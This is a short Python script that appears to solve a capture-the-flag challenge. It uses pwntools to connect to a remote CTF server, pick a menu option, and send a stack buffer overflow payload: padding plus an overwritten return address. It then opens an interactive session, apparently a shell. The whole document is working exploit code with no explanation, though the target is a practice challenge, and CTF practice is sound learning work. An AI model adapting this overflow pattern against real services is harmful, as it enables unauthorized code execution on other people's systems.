from pwn import *

r = remote('moreprivateclub.challs.olicyber.it', 10016)

r.sendlineafter(b'?', b'1')
r.sendlineafter(b'?', b'a'*0x37 + p64(0x4012ce))
r.interactive() 